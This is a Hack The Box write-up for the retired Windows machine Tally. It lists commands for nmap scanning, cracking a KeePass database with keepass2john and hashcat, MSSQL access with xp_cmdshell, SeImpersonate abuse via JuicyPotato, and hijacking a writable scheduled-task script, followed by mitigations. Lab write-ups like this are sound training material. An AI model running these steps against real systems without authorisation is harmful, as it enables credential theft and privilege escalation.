---
machine: Tally
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, sharepoint, ftp, keepass, mssql, seimpersonate]
---

# Tally — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

SharePoint leaks FTP credentials. FTP holds a KeePass database and a Firefox installer; the database cracks and grants SMB access. A binary on SMB contains MSSQL credentials, and `xp_cmdshell` yields a shell with `SeImpersonate`. A scheduled task running a writable PowerShell script leads to administrator.

## Recon

```bash
nmap -Pn -sCV -p21,80,445,1433,3389,5985 <IP>
```

- Ports: `21/tcp` FTP, `80/tcp` HTTP, `445/tcp` SMB, `1433/tcp` MSSQL, `3389/tcp` RDP and `5985/tcp` WinRM.
- Services: SharePoint, FTP, SMB, SQL Server and WinRM.
- Technologies: SharePoint, KeePass, MSSQL, PowerShell and SeImpersonate.

## Enumeration

- `tally.htb` running SharePoint.
- FTP credentials in accessible pages or lists.
- KeePass and Firefox on FTP.
- SMB share with a binary and reachable MSSQL.

## Foothold

Extract FTP credentials from SharePoint and download the content. `keepass2john` and Hashcat recover the database password; that credential opens SMB, where a binary leaks the MSSQL username and password.

```bash
curl -s http://tally.htb/
ftp tally.htb
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
netexec smb tally.htb -u <USER> -p '<PASS>' --shares
mssqlclient.py <DOMAIN>/<USER>:<PASS>@tally.htb -windows-auth
```

## Lateral movement

With MSSQL, enable `xp_cmdshell` and run a shell as the service account. That account holds `SeImpersonate`, exploited with JuicyPotato or PrintSpoofer.

## Privilege escalation

The impersonated shell exposes scheduled tasks. One task runs a writable PowerShell script as administrator; modify it to launch a shell and wait for the next run.

```bash
whoami /priv
JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t *
schtasks /query /fo LIST /v
# Add the payload to the writable task script and wait
schtasks /run /tn <TASK>
```

## Evidence

- FTP credentials from SharePoint.
- Cracked KeePass and SMB/MSSQL access.
- `SeImpersonate` and modified scheduled task.

## Lessons learned

- SharePoint can leak credentials for other services.
- An old KeePass database is crackable with a weak password.
- Scheduled tasks with writable scripts are a classic escalation.

## Mitigation and detection

- Restrict SharePoint and rotate FTP credentials.
- Use KeePass with a strong passphrase and modern KDF.
- Remove `SeImpersonate` from service accounts and protect task scripts.

## References

- [0xdf — Tally](https://0xdf.gitlab.io/2022/04/11/htb-tally.html)
- [IppSec — Tally](https://www.youtube.com/watch?v=l-wzBhc9wFc)
- [Hack The Box — Tally](https://app.hackthebox.com/machines/tally)
